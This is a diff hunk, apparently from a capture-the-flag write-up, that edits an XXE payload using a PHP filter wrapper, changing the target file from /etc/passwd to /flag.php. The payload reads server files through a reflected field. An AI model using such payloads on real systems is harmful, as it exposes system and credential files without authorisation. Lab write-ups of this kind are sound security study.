@@ -70,7 +70,7 @@ The `<name>` field is reflected in the response. Using a PHP filter wrapper to b
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
 ]>
 <root>
   <name>&file;</name>
